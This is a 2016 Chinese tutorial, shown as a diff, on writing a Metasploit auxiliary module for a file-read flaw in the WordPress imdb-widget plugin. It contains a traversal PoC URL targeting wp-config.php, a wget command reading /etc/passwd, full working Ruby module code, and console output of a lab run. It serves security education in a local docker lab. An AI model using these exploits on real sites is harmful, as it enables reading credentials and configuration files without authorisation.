@@ -1,0 +1,429 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">Metasploit module开发入门篇</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">小饼仔</a> <span class="bull">·</span> <time title="2016/04/06 10:27" ui-time="" datetime="2016/04/06 10:27" class="published ng-binding ng-isolate-scope">2016/04/06 10:27</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h2>0x00 概述</h2><hr><p>Metasploit——渗透测试神器，相信大家应该都用过或听过，drops里也有很多白帽子写过相关的文章，介绍如何使用Metasploit。使用过Metasploit的同学应该知道，Metasploit Framework是高度模块化的，即框架是由多个module组成，我们除了可以使用已有的 module，还可以自行编写module来满足自己的需求，模块化使得框架具有很好的可扩展性，这也是为什么Metasploit Framework这么受欢迎的原因之一。</p><p>看了看drops之前的文章，好像没人写过关于如何编写 Metasploit Module，刚好最近在捣鼓Metasploit，顺便复习下快遗忘的ruby，记录下自己学习的过程。</p><p>因为是入门篇，所以这里以一个非常简单WordPress Plugin的任意文件读取漏洞作为例子，搭建环境，编写自己的Auxiliary module（辅助模块），然后测试验证，介绍编写自己的 module的步骤和方法。</p><p>文中如果有说的不对或不准确的地方，欢迎大家指出～</p><h2>0x01 漏洞环境</h2><hr><p>漏洞环境是一个WordPress 插件<a href="https://wordpress.org/plugins/imdb-widget/">imdb-widget</a> 1.0.8版本的任意文件读取漏洞，缺陷代码存在于pic.php，代码：</p><pre><code>&lt;?php
+header( 'Content-Type: image/jpeg' );
+readfile( $_GET["url"] );
+</code></pre><p>PoC：</p><pre><code>/wp-content/plugins/imdb-widget/pic.php?url=../../../wp-config.php
+</code></pre><p>因为 Content-Type 被设置成了 image/jpeg，所以访问后需要点击另存为文本文件，然后打开就可以获取到文件内容</p><p>可以参考<a href="https://www.exploit-db.com/exploits/39621/">Wordpress Plugin IMDb Profile Widget 1.0.8 - Local File Inclusion</a></p><h2>0x02 环境搭建</h2><hr><p>环境搭建包括两部分</p><p><strong>Metasploit</strong></p><p>这里使用 Kali 2.0，自带Metasploit，比较方便，下载<a href="https://www.offensive-security.com/kali-linux-vmware-virtualbox-image-download/">Prebuilt Kali Linux VirtualBox Images</a>，导入VirtualBox就可以用，这里就不细说了</p><p><strong>WordPress 插件漏洞环境</strong></p><p>这里使用docker来搭建，操作系统为 Ubuntu 14.04，docker的安装大家可以 google下</p><p>拉取 WordPress image</p><pre><code>docker pull wordpress:4.4.2
+</code></pre><p>拉取 Mysql image</p><pre><code>docker pull mysql:5.7.11
+</code></pre><p>拉取过程可能会比较慢，可以装个Shadow(socks)和proxychains，再proxychains docker pull</p><p>启动 mysql container</p><pre><code>docker run -d -p 3306:3306 --name mysql -e MYSQL_ROOT_PASSWORD=root mysql:5.7.11
+</code></pre><p>启动 wordpress container</p><pre><code>docker run -d --name wordpress --link mysql:mysql -p 80:80 wordpress:4.4.2
+</code></pre><p>访问</p><pre><code>http://127.0.0.1/
+</code></pre><p>根据页面提示Install就行</p><p>接着登录后台</p><pre><code>http://127.0.0.1/wp-login.php
+</code></pre><p>下载插件imdb-widget有漏洞的<a href="https://downloads.wordpress.org/plugin/imdb-widget.1.0.8.zip">1.0.8版本</a>，点击左边导航栏的 插件 - 安装插件 - 上传插件，选择刚才下载的zip包，点现在安装 - 启用插件</p><p>然后点击 外观 - 小工具，把左边的 IMDb Profile 拖到 挂件区域的第一个位置，点开设置User id，随便填一个如<code>ur1</code>，Show 随便勾选几个，点保存。主页刷新就可以看到了</p><p><a href="http://drops.wooyun.org/wp-content/uploads/2016/04/F38F9F26-CDAE-4370-A01F-34416B4A297F.jpg"><img alt="" title="F38F9F26-CDAE-4370-A01F-34416B4A297F" class="alignnone size-full wp-image-14409" img-src="2016040416112163137.jpg"></a></p><p>测试漏洞，执行如下命令，就可以看到 <code>/etc/passwd</code> 的内容</p><pre><code>wget -O result.txt http://127.0.0.1/wp-content/plugins/imdb-widget/pic.php?url=../../../../../../../../../etc/passwd
+
+cat result.txt
+...
+</code></pre><h2>0x03 编写Module</h2><hr><p>编写之前先简单介绍一些概念相关的东西</p><p>Metasploit中的 Module Tree 分为两种，<code>Primary Module Tree</code> 和 <code>User-Specified Module Tree</code>，前者用于放框架自带的module，后者用于放自己写的module.</p><p>Primary Module Tree在目录 <code>/usr/share/metasploit-framework/modules/</code> 下</p><p>User-Specified Module Tree 在 <code>~/.msf7/modules/</code>（官网写的是~/.msf4/modules/）</p><p>Module的分类包括6种：</p><pre><code>drwxr-xr-x 20 root root 4.0K Jan 28 05:38 auxiliary
+drwxr-xr-x 11 root root 4.0K Jan 28 05:38 encoders
+drwxr-xr-x 18 root root 4.0K Jan 28 05:38 exploits
+drwxr-xr-x  9 root root 4.0K Jan 28 05:38 nops
+drwxr-xr-x  5 root root 4.0K Jan 28 05:38 payloads
+drwxr-xr-x 11 root root 4.0K Jan 28 05:38 post
+</code></pre><p>根据官网的介绍，翻译过来大概意思是：</p><p><code>auxiliary</code>：辅助模块，不带有payload的exploit，比如一些扫描模块</p><p><code>payloads</code>：远程运行的代码，比如反弹shell的代码</p><p><code>exploits</code>：带有payload的exploit</p><p><code>encoders</code>：用于对payload进行编码</p><p><code>nops</code>：保持paload大小的一致性</p><p><code>post</code>: 获取权限后，用于后续渗透阶段的模块</p><p>因为任意读取漏洞是用于获取信息的，并不能直接获取系统权限，即不带有 payload ，因此我们要编写的module是属于auxiliary分类下的。</p><p>编写之前，我们来分析下任意文件读取漏洞auxiliary module需要完成的功能，简单来说：</p><ol><li>检查插件版本，看是否为存在漏洞的版本，如果不是，则返回invulnerable，如果是或不确定，比如获取不到版本信息，则执行2</li><li>向存在漏洞的页面发送http请求，获取某个指定文件的内容，如果获取成功，则保存文件到本地。如果获取失败，有两种可能性，一是插件不存在漏洞，对应前面获取不到版本信息的情况；二是文件不存在或文件的权限问题；需要根据返回做相应处理</li></ol><p>注：这里检查插件是否存在，应该由另一个module来完成，这里只负责检测插件是否存在漏洞</p><p>分析完后，就得开始写module了，那么这里有两种方法：</p><ol><li>找一个auxiliary module的代码skeleton，然后一点点自己写；</li><li>找一个类似的已经写好的module，在它的基础上改写；</li></ol><p>这里推荐第二种，比较适合我这种新手，有参考，写起来也容易些，那么如何找到可以参考的module呢？莫慌～</p><p>打开<code>msfconsole</code>，因为是文件读取，可以先search wordpress然后再找 read 关键词，在<code>msfconsole</code>中执行</p><pre><code>msf &gt; grep "read" search wordpress
+</code></pre><p>找到如下几个module</p><pre><code>auxiliary/scanner/http/wp_dukapress_file_read                                   normal     WordPress DukaPress Plugin File Read Vulnerability
+
+auxiliary/scanner/http/wp_gimedia_library_file_read                             normal     WordPress GI-Media Library Plugin Directory Traversal Vulnerability
+
+auxiliary/scanner/http/wp_imdb_profile_widget_file_read                         normal     WordPress IMDb Profile Widget Plugin File Read Vulnerability
+
+auxiliary/scanner/http/wp_mobileedition_file_read                               normal     WordPress Mobile Edition File Read Vulnerability
+
+auxiliary/scanner/http/wp_nextgen_galley_file_read                              normal     WordPress NextGEN Gallery Directory Read Vulnerability
+
+auxiliary/scanner/http/wp_simple_backup_file_read                               normal     WordPress Simple Backup File Read Vulnerability
+
+auxiliary/scanner/http/wp_subscribe_comments_file_read                          normal     WordPress Subscribe Comments File Read Vulnerability
+</code></pre><p>这里选择<code>auxiliary/scanner/http/wp_dukapress_file_read</code>，具体文件位于<code>/usr/share/metasploit-framework/modules/auxiliary/scanner/http/wp_dukapress_file_read.rb</code></p><p>代码如下：</p><pre><code>require 'msf/core'
+
+class Metasploit3 &lt; Msf::Auxiliary
+
+  include Msf::Auxiliary::Report
+
+  include Msf::Exploit::Remote::HTTP::Wordpress
+
+  include Msf::Auxiliary::Scanner
+
+  def initialize(info = {})
+
+    super(update_info(info,
+      'Name'           =&gt; 'WordPress DukaPress Plugin File Read Vulnerability',
+      'Description'    =&gt; %q{
+        This module exploits a directory traversal vulnerability in WordPress Plugin
+        "DukaPress" version 2.5.2, allowing to read arbitrary files with the
+        web server privileges.
+      },
+      'References'     =&gt;
+        [
+          ['EDB', '35346'],
+          ['CVE', '2014-8799'],
+          ['WPVDB', '7731'],
+          ['OSVDB', '115130']
+        ],
+      'Author'         =&gt;
+        [
+          'Kacper Szurek', # Vulnerability discovery
+          'Roberto Soares Espreto &lt;robertoespreto[at]gmail.com&gt;' # Metasploit module
+        ],
+      'License'        =&gt; MSF_LICENSE
+    ))
+
+    register_options(
+      [
+        OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),
+        OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 7 ])
+      ], self.class)
+
+  end
+
+  def check
+
+    check_plugin_version_from_readme('dukapress', '2.5.7')
+
+  end
+
+  def run_host(ip)
+
+    traversal = "../" * datastore['DEPTH']
+    filename = datastore['FILEPATH']
+    filename = filename[1, filename.length] if filename =~ /^\//
+
+    res = send_request_cgi({
+      'method' =&gt; 'GET',
+      'uri'    =&gt; normalize_uri(wordpress_url_plugins, 'dukapress', 'lib', 'dp_image.php'),
+      'vars_get' =&gt;
+        {
+          'src' =&gt; "#{traversal}#{filename}"
+        }
+    })
+
+    if res &amp;&amp; res.code == 200 &amp;&amp; res.body.length &gt; 0
+
+      print_status('Downloading file...')
+      print_line("\n#{res.body}")
+
+      fname = datastore['FILEPATH']
+
+      path = store_loot(
+        'dukapress.file',
+        'text/plain',
+        ip,
+        res.body,
+        fname
+      )
+
+      print_good("#{peer} - File saved in: #{path}")
+    else
+      print_error("#{peer} - Nothing was downloaded. You can try to change the DEPTH parameter.")
+    end
+
+  end
+
+end
+</code></pre><p>看到这一堆代码，一般人都会有点晕，不知道从那里下手，莫慌，问google，搜索<code>metasploit write module</code>，搜索结果第三个，<a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-get-started-with-writing-an-exploit">How to get started with writing an exploit</a>，里面有一些module结构的说明. 这里对照着给了代码加了些注释：</p><pre><code># 引入msf core 库
+
+require 'msf/core'
+
+# 继承 Msf::Auxiliary 类
+
+class Metasploit3 &lt; Msf::Auxiliary
+
+  # 引入三个 module，具体可以查看文档
+
+  include Msf::Auxiliary::Report
+
+  include Msf::Exploit::Remote::HTTP::Wordpress
+
+  include Msf::Auxiliary::Scanner
+
+  # 初始化函数
+
+  def initialize(info = {})
+
+    super(update_info(info,
+      # [Vendor] [Software] [Root Cause] [Vulnerability type] 
+      'Name'           =&gt; 'WordPress DukaPress Plugin File Read Vulnerability',
+      # 描述
+      'Description'    =&gt; %q{
+        This module exploits a directory traversal vulnerability in WordPress Plugin
+        "DukaPress" version 2.5.2, allowing to read arbitrary files with the
+        web server privileges.
+      },
+      # 相关vulnerability 或 exploit的参考
+      'References'     =&gt;
+        [
+          ['EDB', '35346'],
+          ['CVE', '2014-8799'],
+          ['WPVDB', '7731'],
+          ['OSVDB', '115130']
+        ],
+      # 作者
+      'Author'         =&gt;
+        [
+          'Kacper Szurek', # Vulnerability discovery
+          'Roberto Soares Espreto &lt;robertoespreto[at]gmail.com&gt;' # Metasploit module
+        ],
+      'License'        =&gt; MSF_LICENSE
+    ))
+    # 注册需要参数
+    register_options(
+      [
+        # 要获取的文件路径
+        OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),
+        # 遍历深度，用于到达根目录，默认7次../
+        OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 7 ])
+      ], self.class)
+
+  end
+
+  # 用于支持 check 命令；在具体执行exploit前，检查是否存在漏洞
+
+  def check
+
+    # 检查dukapress版本，Wordpress module提供
+    check_plugin_version_from_readme('dukapress', '2.5.7')
+
+  end
+
+  def run_host(ip)
+
+    traversal = "../" * datastore['DEPTH']
+    filename = datastore['FILEPATH']
+    filename = filename[1, filename.length] if filename =~ /^\//
+    # 发送http请求
+    res = send_request_cgi({
+      'method' =&gt; 'GET',
+      'uri'    =&gt; normalize_uri(wordpress_url_plugins, 'dukapress', 'lib', 'dp_image.php'),
+      'vars_get' =&gt;
+        {
+          'src' =&gt; "#{traversal}#{filename}"
+        }
+    })
+    # 检查响应
+    if res &amp;&amp; res.code == 200 &amp;&amp; res.body.length &gt; 0
+
+      print_status('Downloading file...')
+      print_line("\n#{res.body}")
+
+      fname = datastore['FILEPATH']
+      # 保存文件
+      path = store_loot(
+        'dukapress.file',
+        'text/plain',
+        ip,
+        res.body,
+        fname
+      )
+
+      print_good("#{peer} - File saved in: #{path}")
+    else
+      print_error("#{peer} - Nothing was downloaded. You can try to change the DEPTH parameter.")
+    end
+
+  end
+
+end
+</code></pre><p>弄懂大概结构后，我们根据前面的分析，编写自己的module，完成后的代码如下</p><pre><code>#
+
+This module requires Metasploit: http://metasploit.com/download
+
+Current source: https://github.com/rapid7/metasploit-framework
+
+#
+
+# 引入msf core 库
+
+require 'msf/core'
+
+# 继承 Msf::Auxiliary 类
+
+class Metasploit3 &lt; Msf::Auxiliary
+
+  # 引入三个 module，照搬，具体可以查看文档
+
+  include Msf::Auxiliary::Report
+
+  include Msf::Exploit::Remote::HTTP::Wordpress
+
+  include Msf::Auxiliary::Scanner
+
+  # 初始化函数
+
+  def initialize(info = {})
+
+    super(update_info(info,
+      # [Vendor] [Software] [Root Cause] [Vulnerability type] 
+      'Name'           =&gt; 'WordPress IMDb Profile Widget Plugin File Read Vulnerability',
+      # 描述
+      'Description'    =&gt; %q{
+        This module exploits a directory traversal vulnerability in WordPress Plugin
+        "IMDb Profile Widget" version 1.0.8, allowing to read arbitrary files with the
+        web server privileges.
+      },
+      # 相关vulnerability 或 exploit的参考
+      'References'     =&gt;
+        [
+          ['URL', 'https://www.exploit-db.com/exploits/39621/']
+        ],
+      # 作者
+      'Author'         =&gt;
+        [
+          'CrashBandicot @DosPerl', # Vulnerability discovery
+          'blinking.yan &lt;blinking.yan[at]gmail.com&gt;' # Metasploit module
+        ],
+      'License'        =&gt; MSF_LICENSE
+    ))
+    # 注册需要参数
+    register_options(
+      [
+        OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),
+        OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 7 ])
+      ], self.class)
+
+  end
+
+  # 用于支持 check 命令；在具体执行exploit前，检查是否存在漏洞
+
+  def check
+
+    # 检查imdb-widget版本
+    check_plugin_version_from_readme('imdb-widget', '1.0.8')
+
+  end
+
+  # 执行exploit
+
+  def run_host(ip)
+
+    traversal = "../" * datastore['DEPTH']
+    filename = datastore['FILEPATH']
+    filename = filename[1, filename.length] if filename =~ /^\//
+    # 发送读取文件的http请求
+    res = send_request_cgi({
+      'method' =&gt; 'GET',
+      'uri'    =&gt; normalize_uri(wordpress_url_plugins, 'imdb-widget', 'pic.php'),
+      'vars_get' =&gt;
+        {
+          'url' =&gt; "#{traversal}#{filename}"
+        }
+    })
+    # 检查响应
+    if res &amp;&amp; res.code == 200 &amp;&amp; res.body.length &gt; 0
+      # 文件不存在
+      if res.body.include? 'No such file or directory' 
+        print_error("#{peer} - Nothing was downloaded. No such file or directory: /#{filename}. Please change the DEPTH parameter.")
+      # 文件读取权限问题
+      elsif res.body.include? 'Permission denied'
+        print_error("#{peer} - Nothing was downloaded. Permission denied: /#{filename}. Please change the DEPTH parameter.")
+      else
+        print_status('Downloading file...')
+        print_line("\n#{res.body}")
+
+        fname = datastore['FILEPATH']
+        # 保存文件
+        path = store_loot(
+          'imdb-widget.file',
+          'text/plain',
+          ip,
+          res.body,
+          fname
+        )
+
+        print_good("#{peer} - File saved in: #{path}")
+      end
+    else
+      print_error("#{peer} - Http Response Code is not 200 or Plugin is not vulnerable")
+    end
+
+  end
+
+end
+</code></pre><p>可以看到，改动的地方并不是很多。</p><p>因此我们并不需要弄懂所有的类和方法，也可以写出自己的module。</p><p>代码中发送http请求部分可以参考：<a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-Send-an-HTTP-Request-Using-HTTPClient">How to Send an HTTP Request Using HTTPClient</a></p><h2>0x04 测试Module</h2><hr><p>前面提到，msf有专门的目录<code>~/.msf7/modules/</code>来存放自己编写的module，这里对照着<code>auxiliary/scanner/http/wp_dukapress_file_read</code>，创建目录</p><pre><code>mkdir -p  ~/.msf7/modules/auxiliary/scanner/http/
+</code></pre><p>将代码保存<code>~/.msf7/modules/auxiliary/scanner/http/</code>目录下，文件名为<code>wp_imdb_profile_widget_file_read.rb</code>，重启msfconsole，加载自定义module，执行</p><pre><code>msfconsole -m ~/.msf7/modules
+</code></pre><p>查看下插件是否已经被load</p><pre><code>msf &gt; grep "imdb" search wordpress
+
+auxiliary/scanner/http/wp_imdb_profile_widget_file_read                         normal     WordPress IMDb Profile Widget Plugin File Read Vulnerability
+</code></pre><p>对前面的漏洞环境进行测试，这里wordpress的ip为<code>192.168.1.191</code></p><pre><code>msf &gt; use auxiliary/scanner/http/wp_imdb_profile_widget_file_read
+
+msf auxiliary(wp_imdb_profile_widget_file_read) &gt; show options 
+
+Module options (auxiliary/scanner/http/wp_imdb_profile_widget_file_read):
+
+   Name       Current Setting  Required  Description
+
+---
+
+   DEPTH      7                yes       Traversal Depth (to reach the root folder)
+
+   FILEPATH   /etc/passwd      yes       The path to the file to read
+
+   Proxies                     no        A proxy chain of format type:host:port,type:host:port
+
+   RHOSTS                      yes       The target address range or CIDR identifier
+
+   RPORT      80               yes       The target port
+
+   TARGETURI  /                yes       The base path to the wordpress application
+
+   THREADS    1                yes       The number of concurrent threads
+
+   VHOST                       no        HTTP server virtual host
+
+msf auxiliary(wp_imdb_profile_widget_file_read) &gt; set rhosts 192.168.1.191
+
+rhosts =&gt; 192.168.1.191
+
+msf auxiliary(wp_imdb_profile_widget_file_read) &gt; run
+
+[*] Downloading file...
+
+root:x:0:0:root:/root:/bin/bash
+
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+
+sync:x:4:65534:sync:/bin:/bin/sync
+
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+
+systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
+
+systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
+
+systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+
+systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
+
+[+] 192.168.1.191:80 - File saved in: /root/.msf7/loot/20160403132842default192.168.1.191imdbwidget.file266865.txt
+
+[*] Scanned 1 of 1 hosts (100% complete)
+
+[*] Auxiliary module execution completed
+
+msf auxiliary(wp_imdb_profile_widget_file_read) &gt; 
+</code></pre><p>成功读取到/etc/passwd，测试成功～</p><h2>0x05 结论</h2><hr><p>文章主要介绍的是如何去编写module的方法，有的地方可能写的不是很详细。总结来说就是： 在接触一个新的东西时，参考别人已经写好的东西，然后修修改改，是一种很好快速入门的方法。</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="donate" style="padding:10px;border-top:1px solid #d9d9d9;text-align:center"><span>碎银子打赏，作者好攒钱娶媳妇：</span><br><br><img src="http://static.wooyun.org/wooyun/upload/donate/20160325101543245a92728e13f23a463b7f3e1131a466.jpeg" style="width:200px;height:200px"></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">_Evil</span> <span class="reply-time">2016-04-12 23:23:40</span></div><p></p><p>msf我一般就用来爆破OWA和爆破snmp...</p><p>Linux下有expect来做一些交互的东西...</p><p>能反弹出来,用ssh代理socks或者反弹端口;本地putty做个代理比较稳定和便捷.</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">_Evil</span> <span class="reply-time">2016-04-12 23:21:18</span></div><p></p><p>阅读完,留言点赞;是对作者的尊重</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小饼仔</span> <span class="reply-time">2016-04-06 12:24:36</span></div><p></p><p>@eleven.i386<br>check_plugin_version_from_readme 函数是读取插件的readme来获取版本.<br>文档 https://rapid7.github.io/metasploit-framework/api/Msf/Exploit/Remote/HTTP/Wordpress/Version.html#check_plugin_version_from_readme-instance_method</p><p>删掉了readme，就没发直接获取版本信息。不同版本的插件，可能会有一些不同的地方，这个就需要自己写代码解析了。可以参考<br>https://github.com/rapid7/metasploit-framework/wiki/How-to-write-a-check()-method<br>https://rapid7.github.io/metasploit-framework/api/Msf/Exploit/CheckCode.html</p><p>没发获取版本的情况，就无法确定是否存在漏洞，可以直接打poc，通过响应来判断是否成功。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">eleven.i386</span> <span class="reply-time">2016-04-06 10:35:52</span></div><p></p><p>我想说version_readme是否是读取插件的readme? 如果插件的readme删掉了.不就无法判断版本了? 对wp的插件不熟悉. 不知道readme是否必须条件</p><p></p></div></div></div></div></div></main>
